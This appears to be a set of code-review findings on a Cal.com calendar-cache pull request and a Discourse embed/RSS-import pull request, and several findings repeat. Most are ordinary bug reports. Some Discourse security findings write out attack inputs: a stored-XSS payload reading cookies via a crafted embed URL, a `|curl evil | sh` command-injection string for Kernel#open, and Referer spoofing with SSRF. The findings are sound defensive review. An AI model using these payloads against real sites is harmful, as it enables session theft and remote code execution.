body: `sed -i '' -E "s|...|...|" "$ENV_FILE"` uses the BSD form of in-place editing. On GNU sed (Linux, which is what most contributors and CI use) `-i ''` is parsed as `-i` with no suffix followed by `''` as the sed script and `-E` as a filename, producing `sed: can't read -E: No such file or directory` and leaving `GOOGLE_WEBHOOK_URL` unchanged. Use a portable approach (e.g. `sed -i.bak ... && rm "$ENV_FILE.bak"`, or detect the platform).

title: ENV_FILE is resolved relative to the caller's cwd, not the script location
body: `ENV_FILE="../.env"` assumes the script is executed from inside `scripts/`. Running it the conventional way from the repo root (`./scripts/test-gcal-webhooks.sh`) resolves to a `.env` one directory *above* the repository; the script then prints a warning, `touch`es a stray file outside the repo and writes `GOOGLE_WEBHOOK_URL` there, so the app never picks it up. Resolve relative to the script: `ENV_FILE="$(cd "$(dirname "$0")/.." && pwd)/.env"`. Additionally, `cleanup` always `exit 0`, so the failure paths (rate limit hit, URL not extracted) report success to the caller.

title: Cache timestamp is hard-coded to the en-US locale
body: `new Intl.DateTimeFormat("en-US", ...)` ignores the user's locale even though the surrounding strings are translated via `useLocale`. Non-English users will see a US-formatted date (M/D/YY, 12-hour clock) inside a localized sentence. `useLocale()` exposes the current locale (and the codebase already has dayjs/timeFormat helpers) — use it instead of the literal.

title: UserWithCalendars now requires `updatedAt` and `googleChannelId` on selected calendars although neither is used
body: The `Pick<SelectedCalendar, ...>` for `allSelectedCalendars`/`userLevelSelectedCalendars` was widened to require `updatedAt` and `googleChannelId`, but nothing in this file (or in `connectedCalendars.handler.ts`) reads those fields — the UI gets its timestamp from `CalendarCache.updatedAt`. This tightens the public input type of `getConnectedDestinationCalendarsAndEnsureDefaultsInDb`, which is re-exported for `@calcom/platform-libraries`/API v2, so any caller that builds the user object with an explicit `select` of only `externalId/integration/eventTypeId` will now fail type-checking for no functional benefit. Either drop the additions or actually use them.

title: Migration header contradicts the statement and legacy rows will show the migration time as 'last updated'
body: The header comment says the column is added "without a default value. This is not possible if the table is not empty", but the statement right below adds it with `DEFAULT NOW()`, so the warning is stale/misleading. More importantly, every pre-existing `CalendarCache` row is stamped with the migration run time, so after deploy the new UI will display "Last updated: <deploy time>" for all legacy caches regardless of how old their contents actually are. Consider back-filling from a meaningful value (e.g. `expiresAt - interval '30 days'`, which mirrors `CACHING_TIME`) or fix the comment to explain the inaccuracy.

title: CalendarCacheRepository is instantiated directly, bypassing the calendar-cache feature flag
body: Elsewhere the repository is obtained through `CalendarCache.init(...)`, which returns `CalendarCacheRepositoryMock` when the `calendar-cache` feature is disabled. Here `new CalendarCacheRepository()` is used unconditionally, so every `connectedCalendars` query performs an extra `groupBy` on `CalendarCache` and may surface stale cache status for deployments/teams that have the feature turned off (the mock, which this PR also updated, is never reached from this path).

title: `dev:cron` switched to `npx tsx` but `tsx` is not a declared dependency
body: The script now runs `npx tsx cron-tester.ts` while `tsx` is not listed in `dependencies`/`devDependencies` (only `ts-node` is). `npx` will try to download the latest `tsx` at invocation time, which is non-reproducible, fails offline, and bypasses yarn's lockfile. Either add `tsx` as a devDependency and call it directly, or keep `ts-node`. This change is also unrelated to the PR's stated scope.

title: No tests for the new deleteCache handler or getCacheStatusByCredentialIds
body: The PR adds a destructive mutation with an ownership check and a new repository aggregation, but no unit/integration tests: there is nothing asserting that a user cannot delete another user's cache, that the cache rows are actually removed, or that `getCacheStatusByCredentialIds` returns the max `updatedAt` per credential. The PR description itself notes local verification was not possible. At minimum add handler tests for the forbidden/success paths and a repository test for the groupBy mapping.

title: deleteCache mutation never invalidates connectedCalendars query, leaving stale cache status in UI
body: The `deleteCacheMutation` only shows a toast and calls the optional `onSuccess` prop. In `SelectedCalendarsSettingsWebWrapper` that prop is `props.onChanged`, which most callers (e.g. /apps/installed/calendar) do not pass. Unlike `disconnectMutation`, there is no `onSettled` that calls `utils.viewer.calendars.connectedCalendars.invalidate()`. As a result, after a successful cache deletion the dropdown continues to show "Cache Status / Last updated: ..." and the "Delete cached data" action for data that no longer exists until the user hard-refreshes. Add an invalidation of `viewer.calendars.connectedCalendars` on settle.

title: UserWithCalendars now requires updatedAt/googleChannelId on selected calendars, breaking other callers
body: `UserWithCalendars` is tightened so that `allSelectedCalendars` and `userLevelSelectedCalendars` must include `updatedAt` and `googleChannelId`. Only the session-user select in `UserRepository.findUnlockedUserForSession` was updated to provide these. `getConnectedDestinationCalendarsAndEnsureDefaultsInDb` is also exported for `@calcom/platform-libraries` (legacy `getConnectedDestinationCalendars`) and consumed by API v2 and other callers that build the user object from `withSelectedCalendars` over a narrower select; those callers will now fail type-checking (or need an extra DB column in every query) even though neither new field is actually read anywhere in this PR. The frontend uses `cacheUpdatedAt` from CalendarCache, so this type change appears unnecessary and should be reverted or the fields made optional.

title: Cache status ignores expiresAt, reporting expired rows as live cache
body: `getCacheStatusByCredentialIds` groups all `CalendarCache` rows by credential with no `expiresAt: { gte: now }` filter. `getCachedAvailability` only serves rows that have not expired, so a credential whose only rows are expired (e.g. subscription lapsed a month ago) will still show a "Cache Status / Last updated" entry and a delete action in the UI even though no cache is being served. The status should apply the same `expiresAt` filter as the read path, or expose expiry separately.

title: Unused extra write to every SelectedCalendar on each webhook/cache refresh
body: `fetchAvailabilityAndSetCache` now runs `SelectedCalendarRepository.updateManyByCredentialId(this.credential.id, {})` after every cache refresh (triggered by every Google webhook and by unwatch). This issues an `UPDATE ... SET updatedAt = now()` across all SelectedCalendar rows for the credential solely to bump `@updatedAt`, but the PR's own description notes this value is not used anywhere in the UI (the frontend reads `CalendarCache.updatedAt`). It adds write load and row-lock contention on a hot path for no consumer. Either remove it or add the consumer that needs it.

title: Access-denied case throws a plain Error, surfacing as 500 INTERNAL_SERVER_ERROR
body: When the credential does not exist or belongs to another user the handler throws `new Error("Credential not found or access denied")`. tRPC maps non-`TRPCError` exceptions to `INTERNAL_SERVER_ERROR`, so clients get a 500 (and it will be reported as a server error in monitoring) for what is a 404/403 client condition. Other handlers in this router use `TRPCError` with `NOT_FOUND`/`FORBIDDEN`; this one should too.

title: Instantiates CalendarCacheRepository directly, bypassing the calendar-cache feature flag
body: The handler calls `new CalendarCacheRepository()` instead of `CalendarCache.init(...)`/`CalendarCache.initFromCredentialId`, which returns `CalendarCacheRepositoryMock` when the `calendar-cache` feature is disabled. This means an extra `groupBy` query on `CalendarCache` is executed on every connectedCalendars load for all users, including those for whom the feature is off and the table has no relevant rows. The mock's new `getCacheStatusByCredentialIds` method is therefore never reached from this code path.

title: Timestamp is formatted with a hard-coded en-US locale
body: `new Intl.DateTimeFormat("en-US", ...)` ignores the user's locale and time format preferences, so non-English users see US-formatted dates (MM/DD/YY, 12-hour) inside an otherwise translated menu. Use the locale from `useLocale()` (or the existing dayjs helpers with the user's timeFormat) for consistency with the rest of the app.

title: Migration header warning contradicts the actual SQL
body: The header states the column was "Added ... without a default value. This is not possible if the table is not empty", but the statement below adds the column `NOT NULL DEFAULT NOW()`. The stale auto-generated warning is misleading to anyone auditing migrations for data-safety; it should be removed or reworded to match the SQL.

title: sed -i '' is BSD/macOS-only; fails on Linux
body: `sed -i '' -E ...` is the macOS/BSD form of in-place editing. GNU sed (Linux, most CI/dev containers) interprets `''` as a filename and errors with "can't read : No such file or directory", so `GOOGLE_WEBHOOK_URL` is never updated. Additionally `ENV_FILE="../.env"` is resolved relative to the current working directory rather than the script location, so running `scripts/test-gcal-webhooks.sh` from the repo root writes to a `.env` outside the repository. Use a portable approach (e.g. `sed -i.bak` then remove, or a temp file) and resolve the env path from `$(dirname "$0")`.

title: dev:cron uses npx tsx but tsx is not a declared dependency
body: `dev:cron` now runs `npx tsx cron-tester.ts`, yet `tsx` is not listed in `dependencies` or `devDependencies` (only `ts-node` is). `npx` will attempt a network download at run time with an unpinned version, which fails offline and is non-reproducible. Add `tsx` to devDependencies (and invoke it via `tsx` rather than `npx tsx`), or keep `ts-node`.

title: No tests for new deleteCache handler or cache-status repository method
body: The PR adds a destructive mutation (`deleteCacheHandler`), a new repository query (`getCacheStatusByCredentialIds`), and enrichment logic in `connectedCalendarsHandler`, but includes no unit or integration tests. In particular the ownership check (another user's credentialId must be rejected) and the credential→updatedAt mapping are untested; the PR description itself says local testing was not possible. Add tests for the rejection path and for the mapping with multiple cache rows per credential.

title: Stored XSS: embed URL interpolated unescaped into raw-HTML post
body: `TopicEmbed.import` appends `#{url}` to the post contents with no HTML/attribute escaping, and the post is created with `cook_method: raw_html`, which (per the new `Post#cook`) bypasses sanitization entirely. The `url` is attacker-influenced: `EmbedController#best` accepts any `embed_url` param and `TopicRetriever` only checks that the URI host equals `embeddable_host`, so the path/query are free-form. `'`, `=`, `(`, `)` are valid URI characters, so a request like `/embed/best?embed_url=http://host/real-post?x='onmouseover='alert(1)` (with a spoofed Referer) makes the job fetch the real page (query strings are ignored by most servers) and store `` in a public topic authored by the embed user. Nokogiri in `absolutize_urls` preserves the injected attribute. Escape `url` with `ERB::Util.html_escape`/`CGI.escapeHTML` (and ideally sanitize the whole imported HTML before storing it as raw_html).

title: Unauthenticated callers can trigger arbitrary server-side fetches and unbounded topic creation
body: Any request to `/embed/best?embed_url=...` with a spoofed `Referer` header (the only check in `ensure_embeddable`) enqueues `RetrieveTopic`, which fetches the URL with `open-uri` and creates a new topic as the `embed_by_username` user. The only constraint is that the URI host matches `embeddable_host`; the path and query string are arbitrary, so `http://host/page?1`, `http://host/page?2`, ... each produce a distinct `TopicEmbed` and topic. The throttle in `TopicRetriever#retrieved_recently?` is keyed on the full URL (`"retrieved:#{@embed_url}"`), so it does not limit this at all. Consequences: unbounded topic spam from the forum's own account, and server-side request amplification (open-uri also follows redirects to any host, so an open redirect on the embeddable site turns this into SSRF). Consider a global rate limit, normalizing/stripping query strings, verifying the fetched page actually references the forum, and/or requiring a successful 200 from a canonical URL.

title: absolutize_urls corrupts protocol-relative URLs
body: `absolutize_urls` treats any `href`/`src` that `start_with?('/')` as site-relative and rewrites it to `#{prefix}/#{href.sub(/^\/+/, '')}`. Protocol-relative URLs such as `//cdn.example.com/img.png` (very common in feeds and CMS output) also start with `/`, so they are turned into `http://embeddable-host/cdn.example.com/img.png`, breaking every such link and image in imported posts. The same bug is on line 70 for `img[src]`. Check `start_with?('//')` first and only prepend the scheme in that case, or use `URI.join(url, href)` which handles all relative forms correctly.

title: i.content can be nil for RSS items, aborting the whole feed import
body: `CGI.unescapeHTML(i.content.scrub)` assumes every feed item has a `content` element. Plain RSS 2.0 feeds commonly only provide `description` (and SimpleRSS returns nil for a missing tag), so `nil.scrub` raises `NoMethodError`. Because the loop has no per-item rescue and the job is `retry: false`, a single item without content makes every hourly poll fail and nothing from the feed is ever imported. The same applies to a nil `i.title`. Fall back to `i.description`/`i.summary` and skip items with no usable body instead of raising.

title: Host-spam check still applies to imports and post errors are not checked
body: `PostCreator.new(..., skip_validations: true)` skips model validations but not `rollback_if_host_spam_detected`. Every imported post links to the embeddable host (the appended "Imported from" link plus absolutized links), so once the `embed_by_username` user (typically a fresh TL0 account) has `newuser_spam_host_threshold` (default 3) posts linking that host, `has_host_spam?` returns true, the post is rolled back, and a spam GroupMessage is sent to moderators on every subsequent import. Worse, `PostCreator#create` still returns the unsaved `@post` object, so `if post.present?` is true and `TopicEmbed.create!(post_id: post.id)` is attempted with a nil `post_id`, which blows up on the NOT NULL constraint. Check `post.errors.blank?`/`post.persisted?` before creating the embed, and bypass the host-spam check for system imports (or require a trusted import user).

title: Every unknown embed URL triggers a full synchronous feed poll
body: `perform_retrieve` calls `Jobs::PollFeed.new.execute({})` whenever `feed_polling_enabled` is on and the URL has no embed yet. That downloads and parses the entire RSS/Atom feed and runs `TopicEmbed.import` (SHA, Nokogiri parse, possible PostRevisor revision) for every item, before even attempting the direct HTTP fetch. Since the per-URL 60s throttle does not limit distinct URLs, a burst of requests for different (or merely query-string-varied) URLs re-fetches and re-imports the whole feed concurrently from multiple Sidekiq workers, hammering both the remote site and the database. At minimum guard the feed poll with a global short-lived lock/throttle rather than running it per embed URL.

title: SETNX followed by EXPIRE is not atomic; key can become permanent
body: `retrieved_recently?` does `$redis.setnx(key, "1")` and then a separate `$redis.expire(key, 60)`. If the worker dies or the Redis connection fails between the two calls, the key is left with no TTL, and that embed URL is throttled forever (`setnx` will always return false), so its topic can never be retrieved for non-staff users. Use `SET key 1 NX EX 60` (atomic) or wrap in MULTI.

title: `<%- end if %>` is a typo that only compiles by accident
body: The conditional is closed with `<%- end if %>` instead of `<%- end %>`. Ruby parses the trailing `if` as a statement modifier whose condition is the next generated ERB statement (the buffer append for the following whitespace/text), so the template happens to compile, but the order of evaluation is now dependent on how the ERB engine emits the surrounding code and will break with a syntax error if the following text segment is removed or the template compiler changes (e.g. switching Erubis/Erubi). Replace with `<%- end %>`.

title: `force: true` added to create_table drops existing data on re-run
body: This migration (unrelated to the embed feature) is changed to `create_table :top_topics, force: true`, and the new `create_topic_embeds` migration also uses `force: true`. `force: true` issues `DROP TABLE IF EXISTS` before creating, so any environment where the table already exists (e.g. re-running migrations after a partial failure, or a schema drift) silently loses all rows. Migrations should not use `force: true`; if the goal is idempotency, guard with `unless table_exists?`.

title: Origin check uses substring match and URL assumes trailing slash
body: `discourseUrl.indexOf(e.origin) === -1` accepts any origin that is a substring of `discourseUrl`. For `discourseUrl = "https://forum.example.com/"`, messages from `https://forum.example.co` or `https://forum.example.c` (any prefix) pass the check, so a different frame on the host page could resize the embed iframe. Compare `e.origin` against the parsed origin of `discourseUrl` exactly. Separately, line 7 builds `discourseUrl + "embed/best?..."`, which produces a broken URL (`...comembed/best`) unless the site owner remembers to include a trailing slash in `discourseUrl`; normalize the base URL.

title: Updating an embed whose post was deleted raises NoMethodError
body: In the update branch, `post = embed.post` uses the `belongs_to :post` association. `Post` includes `Trashable`, whose default scope hides trashed rows, so if a moderator deleted the imported post, `embed.post` is nil and `PostRevisor.new(nil).revise!` fails on `@post.raw`. For the hourly `PollFeed` job this exception aborts the import loop for every remaining feed item (and `retry: false`), permanently breaking feed polling once any imported post is deleted. Guard against a nil/trashed post (skip or re-create).

title: Disqus import loses thread created_at/category and may crash on bad links
body: The thread topic was previously created with `created_at: Date.parse(t[:created_at])` and an optional `category`; it is now created via `TopicEmbed.import_remote(user, t[:link], title:)`, which ignores both, so all imported Disqus threads get `created_at = now` (breaking topic ordering/dates) and the `-c` option is silently gone. Also `import_remote` calls `open(url)` before any URL validation: a thread with a missing or relative `link` causes `TypeError`/`Errno::ENOENT` from `Kernel#open` and aborts the whole import rather than being skipped as the `return unless url =~ /^https?:/` guard in `TopicEmbed.import` intends.

title: Core import paths are untested
body: The specs only verify that `execute` delegates to `poll_feed`; `poll_feed` itself (SimpleRSS parsing, the `i.content` nil case, link/id fallback), `TopicEmbed.import_remote`, `TopicEmbed.absolutize_urls` (protocol-relative and non-standard-port cases), and the escaping of the appended "Imported from" link are all without coverage. In `spec/controllers/embed_controller_spec.rb` the example titled "is 404 without an embed_url" actually exercises `params.require`, which raises `ActionController::ParameterMissing` (HTTP 400), and the assertion is only `should_not be_success`, so the title is misleading and would not catch a regression in the status code.

title: Unauthenticated users can trigger topic creation for arbitrary URLs on the embeddable host
body: `EmbedController#best` is reachable without login (`current_user` may be nil) and the only gate is a `Referer` header whose host equals `SiteSetting.embeddable_host`; `Referer` is trivially spoofed with curl. For any `embed_url` with no existing `TopicEmbed`, the action enqueues `retrieve_topic`, which (via `TopicRetriever#fetch_http` → `TopicEmbed.import_remote`) fetches the URL and creates a brand-new topic+post as the configured `embed_by_username` user. The redis throttle in `TopicRetriever#retrieved_recently?` is keyed per exact URL, so an attacker can mint unlimited distinct URLs on the allowed host (`http://host/page?x=1`, `?x=2`, ..., or arbitrary ports `http://host:22/`) and have the forum crawl each one and publish a new topic for every variant with identical content. There is no per-client rate limit, no check that the URL path is one the site owner intends to embed, and no dedupe on fetched content. Consequence: anonymous topic flooding / forum spam and an outbound-fetch amplifier.

title: Stored XSS: embed URL interpolated unescaped into raw_html post content
body: `TopicEmbed.import` appends `#{url}` to `contents` without any HTML escaping, and the resulting string is stored as a `raw_html` post whose `cooked` is returned verbatim by `Post#cook` (no sanitization) and rendered with `raw post.cooked` in `embed/best.html.erb` and on the normal topic page. The only validation on `url` is `^https?://` and (in `TopicRetriever`) that `URI(url).host` equals the embeddable host. A single quote is a legal URI sub-delimiter, so an attacker who can reach `embed/best` (see the spoofable Referer check) can supply e.g. `http://embeddable-host/existing-page?'onmouseover='alert(document.cookie)`: the page fetch returns 200, Nokogiri in `absolutize_urls` parses the broken attribute into a real `onmouseover` attribute, and the payload is persisted as cooked HTML and executed for every forum visitor. The URL must be HTML-attribute-escaped (e.g. `ERB::Util.html_escape`) before interpolation, or the footer built with Nokogiri.

title: import_remote uses Kernel#open on a semi-trusted URL with no scheme check, timeout, size limit or redirect restriction
body: `TopicEmbed.import_remote` calls `open(url).read` (Kernel#open via open-uri) before `import` performs its `^https?://` check, so for the `TopicRetriever` path only the *host* of the URL has been validated. open-uri will follow HTTP redirects to any host, so a page on the embeddable host (or an attacker who can place redirects there) can make the forum fetch internal/other-host resources; there is also no read timeout and no size cap, so a slow or huge response ties up or exhausts a Sidekiq worker. Validate the scheme up front, use an explicit HTTP client with timeouts, a maximum body size, and either disable redirects or re-validate the host on each hop.

title: `post.present?` is the wrong success check for PostCreator; failures surface as NOT NULL violations and abort the import
body: `PostCreator#create` returns the unsaved `Post` object (with `errors` populated) when it rolls back, e.g. when `rollback_if_host_spam_detected` fires. `post.present?` is therefore true even on failure, and the code proceeds to `TopicEmbed.create!(post_id: post.id)` with `post.id == nil`, which hits the `post_id NOT NULL` constraint and raises a `PG::NotNullViolation` out of `import`. This is not a remote edge case: the configured `embed_by_username` user is typically a freshly created bot account at trust level 0, every imported post links to the same external host (the 'Imported from' footer alone guarantees this), and `Post#has_host_spam?` blocks TL0 users after `newuser_spam_host_threshold` (3) posts to the same domain. After the third import every subsequent import raises, the hourly `PollFeed` run aborts on the first item, and moderators receive spam-blocked PMs. Note also that the inner `Post.transaction` in `PostCreator` swallows `ActiveRecord::Rollback` because it is nested in `Topic.transaction` without `requires_new`, so relying on the rollback to clean up is fragile. Check `post.persisted?`/`post.errors.blank?` and either bypass or handle spam/rate-limit checks for the importer user.

title: absolutize_urls mangles protocol-relative URLs (//cdn.example.com/...)
body: Both the `` and `` branches treat anything starting with `/` as site-relative and rewrite it to `"#{prefix}/#{href.sub(/^\/+/, '')}"`. A protocol-relative URL such as `//cdn.example.com/img.png` (very common in WordPress and other feeds) therefore becomes `http://embeddable-host/cdn.example.com/img.png`, which is a broken link/image in every imported post. Only rewrite when the value starts with a single `/` (or use `URI.join(url, href)` which handles all relative forms correctly).

title: Port is omitted/added based on hardcoded 80/443 instead of the scheme's default port
body: `prefix << ":#{uri.port}" if uri.port != 80 && uri.port != 443` drops the port for `https://host:80/` and `http://host:443/`, producing a prefix that points at the wrong port for those (unusual but valid) URLs. Use `uri.port != uri.default_port` so the port is kept exactly when it differs from the scheme default.

title: Re-import of an existing embed crashes if the post was deleted
body: When a `TopicEmbed` row exists, `embed.post` is used unconditionally. `Post` includes `Trashable`, so a post that has been deleted (trashed) is excluded by the default scope and `embed.post` returns nil; `PostRevisor.new(nil).revise!` then raises `NoMethodError` on the next feed poll or retrieve, and since `PollFeed` has no per-item error handling this aborts the whole feed run every hour until the row is removed by hand. Guard for a missing post (skip, or recreate the topic) and consider cleaning up `topic_embeds` when the topic/post is destroyed.

title: `i.content` is nil for ordinary RSS 2.0 feeds and `String#scrub` requires Ruby 2.1
body: SimpleRSS exposes Atom `<content>` as `item.content`; RSS 2.0 feeds that carry the body in `<description>` (or `<content:encoded>`, exposed as `content_encoded`) yield `i.content == nil`, so `i.content.scrub` raises `NoMethodError` on the very first item and the whole poll fails every hour for such feeds. Separately, `String#scrub` was only added in Ruby 2.1.0 (Dec 2013); this codebase still targets 1.9/2.0 (see the Gemfile comments), where the call raises `NoMethodError` even when content is present. Fall back through `content_encoded`/`description`/`summary`, skip items with no body, and avoid `scrub` or guard it with `respond_to?`.

title: No per-item error handling: one bad item (or the post rate limiter) aborts the whole feed
body: The `rss.items.each` loop calls `TopicEmbed.import` with no rescue. Any exception for a single item — malformed `URI`, nil title, the `PostCreator` spam/NOT NULL failure described elsewhere, or `RateLimiter::LimitExceeded` — propagates, `sidekiq_options retry: false` means the job is not retried, and all remaining items are skipped. In particular `Post` declares `rate_limit` (`rate_limit_create_post`, `max_topics_per_day: 20`); unless `embed_by_username` is staff, importing a feed with more than 20 items raises `LimitExceeded` partway through on every run, and `rate_limit_create_post` (5s between posts) will trip on consecutive items. The Disqus thor task explicitly calls `RateLimiter.disable` for the same reason; the job should do likewise (or use a staff-only importer) and wrap each item in a rescue that logs and continues.

title: Feed HTML is stored and rendered completely unsanitized
body: `CGI.unescapeHTML(i.content)` is passed straight to `TopicEmbed.import`, which stores it as a `raw_html` post; `Post#cook` returns `raw` verbatim for that cook method, so no sanitizer (PrettyText/Sanitize) ever runs on it. Unlike `import_remote`, which at least passes content through Readability's tag/attribute whitelist, the RSS path lets `<script>`, event handlers, `javascript:` hrefs, iframes etc. from the feed land in `cooked` and execute for every visitor of the forum and of the embed iframe. A compromised blog, a third-party/aggregated feed, or an author-submitted post on a multi-author site becomes site-wide stored XSS on the forum. Run feed content through the same whitelist used for Readability (or Sanitize) before storing.

title: Throttle key set with SETNX then EXPIRE non-atomically
body: `$redis.setnx(retrieved_key, "1")` followed by a separate `$redis.expire(retrieved_key, 60)` is not atomic. If the worker dies or the Redis connection drops between the two calls, the key persists with no TTL and `retrieved_recently?` returns true forever for that URL, so non-staff visitors can never trigger retrieval of that embed again. Use `SET key 1 NX EX 60` (or `setex` inside a MULTI) so the TTL is applied in the same operation.

title: Every retrieval of an unknown URL synchronously re-polls and re-imports the entire RSS feed
body: When `feed_polling_enabled` is on, `perform_retrieve` runs `Jobs::PollFeed.new.execute({})` inline, which downloads and parses the whole feed and calls `TopicEmbed.import` for every item (each doing a DB lookup, SHA1, Nokogiri parse) before falling back to `fetch_http`. Because `embed/best` enqueues a retrieval for every unknown `embed_url` and the throttle is per-URL, a handful of visitors hitting distinct not-yet-embedded pages (or an attacker varying the query string) causes repeated full feed re-imports on the Sidekiq workers. Consider only consulting the already-scheduled hourly poll results, or at minimum throttling the feed poll itself globally.

title: `<%- end if %>` is a typo that only compiles by accident
body: The closing tag of the header conditional is `<%- end if %>` instead of `<%- end %>`. Erubis emits `end if \n` followed by the next generated statement, so Ruby parses it as `(if ... else ... end) if @output_buffer.safe_append='...'` — a modifier-if whose condition is the whitespace-append statement for the following text node. It happens to be truthy so the template renders, but the output ordering is now dependent on surrounding whitespace and any reformatting of the template (e.g. removing the blank line, or an expression tag immediately following) turns this into a `SyntaxError` that 500s the whole embed endpoint. Replace with `<%- end %>`.

title: Disqus import silently drops the --category option and original topic timestamps
body: The `category` method_option was removed and the topic is now created via `TopicEmbed.import_remote(user, t[:link], title: t[:title])`, which no longer passes `created_at: Date.parse(t[:created_at])` or a category. Imported threads will all appear in the uncategorized category with the import time as their creation date (and therefore sort as brand-new), and anyone invoking the task with `-c` will get a Thor 'unknown option' error. If this is intentional it should be mentioned; otherwise thread `created_at`/`category` through `import_remote`/`import` opts to `PostCreator`.

title: Key authorization and parsing paths are untested
body: The controller spec only covers 'no referer'; there is no test that a referer on a *different* host is rejected, which is the actual security property of `ensure_embeddable`. Likewise `spec/jobs/poll_feed_spec.rb` never exercises `poll_feed` itself (nil `content`, non-http `link` falling back to `id`), and `spec/models/topic_embed_spec.rb` has no cases for protocol-relative URLs, non-default ports, or the update path when the post has been deleted — all of which have concrete bugs in this PR. Add tests for referer-host mismatch, a feed item without `content`, and `absolutize_urls` with `//host/path` input.

title: New gems only added to Gemfile_rails4.lock; Rails 3 lockfile not updated
body: `ruby-readability` and `simple-rss` are added unconditionally to the Gemfile, but only `Gemfile_rails4.lock` was regenerated. Booting with `RAILS3=1` resolves against `Gemfile.lock`, which no longer matches the Gemfile; in deployment/frozen mode `bundle install` fails, and in normal mode the lockfile is silently rewritten with potentially different versions. Either regenerate `Gemfile.lock` as well or scope the gems to the rails4 branch.

title: Embed URL is interpolated unescaped into a raw_html post (stored HTML injection)
body: `TopicEmbed.import` appends `#{url}` to `contents` without any escaping, and the resulting post is stored with `cook_method: raw_html`, so `Post#cook` returns it verbatim with no sanitization. The `url` reaches this code from the public, unauthenticated `GET /embed/best?embed_url=...` endpoint via `Jobs::RetrieveTopic` -> `TopicRetriever` -> `TopicEmbed.import_remote`. Only the URL's host is validated (`TopicRetriever#invalid_host?`); the path is attacker-controlled. `URI()` rejects `<`, `>`, `"` and spaces but accepts `'`, so a value like `http:///'onmouseover='alert(1)` passes, and `absolutize_urls` (Nokogiri parse + `to_html`) faithfully re-serializes the injected attribute. If the embeddable host returns 200 for that path (common for CMSs/SPAs with catch-all routes), a topic is created whose first post contains attacker-supplied HTML/JS, which is then rendered via `raw post.cooked` in the embed view and in the normal post stream. The URL (and the RSS `i.link`) must be HTML-escaped (`ERB::Util.html_escape`) before interpolation, and ideally the footer should be built with Nokogiri rather than string concatenation.

title: `post.present?` does not detect a failed PostCreator; outer transaction also swallows PostCreator's rollback
body: `PostCreator#create` returns `@post` even when saving failed (e.g. `rollback_if_host_spam_detected` or a failed `save`), in which case the post has errors and no `id`. `post.present?` is true for such an object, so `TopicEmbed.create!(post_id: post.id)` is attempted with `post_id: nil` and blows up with a NOT NULL violation / `ActiveRecord::StatementInvalid`, aborting the caller (for `PollFeed`, the entire feed run). This is realistic: the `embed_by_username` account is typically a fresh TL0 user, every imported article links back to the same host (content links plus the appended footer link), and after `newuser_spam_host_threshold` (3) imports `Post#has_host_spam?` fires on every subsequent import. Additionally, wrapping `PostCreator.new(...).create` in `Topic.transaction` changes its semantics: the `ActiveRecord::Rollback` raised inside PostCreator's nested, non-`requires_new` `Post.transaction` is swallowed without rolling back the outer transaction, so the Topic created by `TopicCreator` would be committed as an orphan if nothing later raises. Check `post.persisted?`/`post.errors.blank?` and avoid the outer transaction (or use `requires_new: true`).

title: absolutize_urls corrupts protocol-relative URLs (`//cdn.example.com/...`)
body: `absolutize_urls` treats any `href`/`src` that `start_with?('/')` as site-relative, strips all leading slashes with `sub(/^\/+/, '')` and prefixes the embeddable host. A protocol-relative URL such as `//cdn.example.com/img.png` (very common in feeds and CMS output) therefore becomes `http://eviltrout.com/cdn.example.com/img.png`, breaking every such image and link in imported posts. The check should exclude values starting with `//` (or use `URI.join(url, href)` which handles all relative forms correctly).

title: `i.content.scrub` raises on items without `content` (and `scrub` requires Ruby 2.1); one bad item aborts the whole feed
body: SimpleRSS only populates `content` for Atom `<content>` / RSS `<content:encoded>`; plain RSS 2.0 feeds that use `<description>` yield `nil`, so `nil.scrub` raises `NoMethodError`. `String#scrub` itself was introduced in Ruby 2.1.0 (released 25 Dec 2013); the Gemfile/lockfile in this repo target Ruby 1.9.3/2.0, on which `scrub` does not exist at all, so the job fails for every feed. Because the loop has no per-item rescue and the job is `retry: false`, any single malformed item (nil content, nil title, unparseable link that makes `URI()` raise in `absolutize_urls`, a `TopicEmbed.create!` failure) aborts the remaining items for that run, and they are only retried an hour later. Fall back to `i.description`, guard against nil, and rescue/log per item.

title: Kernel#open on an admin-supplied string allows command execution / local file reads
body: `open(SiteSetting.feed_polling_url)` (and `open(url).read` in `TopicEmbed.import_remote`, line 48) uses `Kernel#open`, which open-uri only intercepts for http/https/ftp strings. A value beginning with `|` (e.g. `|curl evil | sh`) spawns a shell command, and a non-URL string opens a local file. `feed_polling_url` is settable from the admin UI, so this lets a forum admin (or anyone who compromises an admin session / the site-settings endpoint) execute commands or read files on the application and Sidekiq hosts, which is a privilege escalation beyond the admin role. `import_remote` is only protected because `TopicRetriever` happens to validate the host first; the Disqus thor task passes XML-provided links straight in. Use `URI.parse(url).open` / `Net::HTTP` and validate that the scheme is http(s) before fetching, and add a read timeout/size limit.

title: Update path crashes when the embed's post has been deleted
body: When a `TopicEmbed` row exists, `import` does `post = embed.post` and, if the content hash changed, calls `PostRevisor.new(post).revise!(...)`. `Post` includes `Trashable`, so once a moderator deletes the imported post (or its topic), `embed.post` returns `nil` and `revise!` fails with `NoMethodError` on `nil.raw`. Since `PollFeed` iterates all feed items without rescue, a single deleted imported topic permanently breaks every subsequent feed poll (and `TopicRetriever#perform_retrieve`, which runs `PollFeed` inline). Guard for `post.nil?` and either skip, recreate, or remove the stale `TopicEmbed`.

title: Every un-embedded page view triggers a full synchronous RSS poll; races with the scheduled poller
body: `perform_retrieve` runs `Jobs::PollFeed.new.execute({})` inline whenever an embed_url has no `TopicEmbed` yet. The redis throttle in `retrieved_recently?` is keyed per embed URL, so N distinct not-yet-imported URLs (or a visitor/bot iterating article URLs on the embeddable host, since the endpoint is unauthenticated) produce N full feed downloads and imports per minute, and the `loading.html.erb` page re-requests every 30s. The inline poll also races with the hourly scheduled `PollFeed` and with concurrent `RetrieveTopic` jobs for other URLs: both see no `TopicEmbed` for an item, both run `PostCreator`, and the loser hits the unique index in `TopicEmbed.create!`, raising out of the job (and having already enqueued `process_post`/`feature_topic_users` for the rolled-back post).
